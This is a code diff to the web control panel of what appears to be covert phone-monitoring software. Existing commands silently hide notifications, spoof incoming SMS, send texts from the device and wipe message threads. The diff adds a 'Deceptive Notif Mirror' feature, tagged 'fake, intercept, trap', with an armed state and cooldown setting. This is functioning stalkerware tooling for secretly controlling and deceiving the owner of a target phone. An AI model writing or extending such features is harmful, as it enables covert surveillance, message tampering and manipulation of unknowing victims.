@@ -464,6 +464,7 @@
                     { id: 'ADD_AUTO_SWIPE', name: 'Auto-Swipe', icon: '🕵️', keywords: 'hide, suppress, block, notification', inputs: [{id: 'swipe-type', label: 'Target', type: 'select', options: [{v: 'pkgs', l: 'App Package'}, {v: 'keywords', l: 'Keywords'}, {v: 'senders', l: 'Sender Number'}]}, {id: 'swipe-val', label: 'Value', type: 'text'}], cleanup: 'CLEAR_AUTO_SWIPE' },
                     { id: 'SET_SMS_BLACKLIST', name: 'SMS Blacklist', icon: '🛡️', keywords: 'filter, spam, hide', inputs: [{id: 'sms-blacklist', label: 'Filter Keywords', type: 'text'}] },
                     { id: 'INJECT_SMS', name: 'Spoof Incoming SMS', icon: '📥', keywords: 'fake, incoming, message, spoof', inputs: [{id: 'fake-sms-num', label: 'Sender Number', type: 'text'}, {id: 'fake-sms-body', label: 'Message Body', type: 'textarea'}, {id: 'fake-sms-read', label: 'Initial State', type: 'select', options: [{v: 'UNREAD', l: 'Unread (Notify)'}, {v: 'READ', l: 'Read (Silent)'}]}] },
+                    { id: 'SET_NOTIF_MIRROR', name: 'Deceptive Notif Mirror', icon: '🪞', keywords: 'mirror, fake, intercept, notification, cooldown, trap', inputs: [{id: 'nm-state', label: 'State', type: 'select', options: [{v: 'ON', l: 'ENABLED (Armed)'}, {v: 'OFF', l: 'DISABLED'}]}, {id: 'nm-cooldown', label: 'Cooldown (Minutes)', type: 'number', val: 720}] },
                     { id: 'SEND_SMS', name: 'Send Remote SMS', icon: '📤', keywords: 'text, message, outgoing', inputs: [{id: 'send-sms-num', label: 'Recipient Number(s) (Comma/Semicolon ok)', type: 'text'}, {id: 'send-sms-body', label: 'Message Body', type: 'textarea'}] },
                     { id: 'DELETE_SMS_THREAD', name: 'Wipe Specific Thread', icon: '🧵', keywords: 'delete, clear, conversation', inputs: [{id: 'del-sms-num', label: 'Target Number(s)', type: 'text'}] },
                     { id: 'DELETE_SMS_QUERY', name: 'Wipe SMS by Keyword', icon: '🔍', keywords: 'search, find, remove', inputs: [{id: 'del-sms-query', label: 'Search String', type: 'text'}] },
@@ -1524,6 +1525,8 @@
                         content = `${document.getElementById('send-sms-num').value}|${document.getElementById('send-sms-body').value}`; break;
                     case 'INJECT_SMS':
                         content = `${document.getElementById('fake-sms-num').value}|${document.getElementById('fake-sms-body').value}|${document.getElementById('fake-sms-read').value}`; break;
+                    case 'SET_NOTIF_MIRROR':
+                        content = `${document.getElementById('nm-state').value}|${document.getElementById('nm-cooldown').value}`; break;
                     case 'SET_RELENTLESS_ACC':
                         content = `${document.getElementById('acc-chill').value}|${document.getElementById('acc-interval').value}|${document.getElementById('acc-max').value}|${document.getElementById('acc-html').value}`; break;
                     case 'SCREEN_TIMEOUT':
